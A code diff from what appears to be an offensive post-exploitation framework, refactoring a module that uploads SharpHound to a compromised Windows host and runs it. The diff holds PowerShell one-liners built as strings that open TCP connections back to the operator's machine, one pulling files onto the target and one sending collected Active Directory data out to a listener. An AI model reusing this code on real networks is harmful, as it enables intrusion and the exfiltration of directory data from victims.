@@ -3,7 +3,6 @@ from __future__ import annotations
 import json
 import os
 import re
-import select
 import tempfile
 import time
 import urllib.request
@@ -11,7 +10,6 @@ import uuid
 import zipfile
 
 from koi.modules.blueprint import KoiModule, TCPReceiveServer
-from koi.utils.tcp import get_local_ip, spawn_send_server
 
 
 _RELEASE_API = "https://api.github.com/repos/SpecterOps/SharpHound/releases/latest"
@@ -72,44 +70,12 @@ class SharpHoundModule(KoiModule):
         finally:
             os.unlink(tmp_path)
 
-    def _send_ps(self, ps_cmd: str) -> None:
-        if self.session.upgraded:
-            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-            time.sleep(0.3)
-            r, _, _ = select.select([self.session.conn], [], [], 1.0)
-            if r:
-                self.session.conn.recv(4096)
-        else:
-            self.sendline(ps_cmd)
-
-    def _upload_bytes(self, raw: bytes, dest: str) -> bool:
-        local_ip = get_local_ip(self.session.addr[0])
-        port, thread, errors = spawn_send_server(raw, timeout=120)
-
-        ps_cmd = (
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_f=[IO.File]::OpenWrite('{dest}');"
-            f"$_b=New-Object byte[] 65536;"
-            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
-            f"$_f.Close();$_c.Close()"
-        )
-        self._send_ps(ps_cmd)
-        thread.join(timeout=120)
-
-        if errors:
-            return False
-
-        time.sleep(0.5)
-        check = self._win_query(f"(Test-Path '{dest}').ToString()")
-        return check.strip().lower() == "true"
-
     def _run_and_collect(
         self, work_dir: str, exe_name: str,
         log_name: str, collection: str, timeout: float,
     ) -> tuple[str, bytes]:
         """Run SharpHound on target, return (status, payload)."""
-        local_ip = get_local_ip(self.session.addr[0])
+        local_ip = self._get_local_ip()
         srv  = TCPReceiveServer(timeout=timeout).start()
         port = srv.port
 
@@ -142,7 +108,7 @@ class SharpHoundModule(KoiModule):
             f"$_s.Write($payload,0,$payload.Length);"
             f"$_s.Flush();$_c.Close()"
         )
-        self._send_ps(ps_cmd)
+        self._dispatch_ps(ps_cmd)
         data = srv.collect()
         if data.startswith(b"OK:"):
             return "ok", data[3:]
@@ -193,12 +159,13 @@ class SharpHoundModule(KoiModule):
         with self.spinner(f"Uploading {len(files)} file(s) to target…"):
             for name, blob in files.items():
                 dest = f"{work}\\{name}"
-                if not self._upload_bytes(blob, dest):
+                if not self._upload_bytes(blob, dest, timeout=120):
                     self.err(f"Upload of {name} failed.")
                     self._cleanup(work)
                     return
 
-        # Verify SharpHound.exe is actually present after upload
+        time.sleep(0.5)
+
         check = self._win_query(f"(Test-Path '{work}\\{exe_nm}').ToString()")
         if check.strip().lower() != "true":
             self.err(
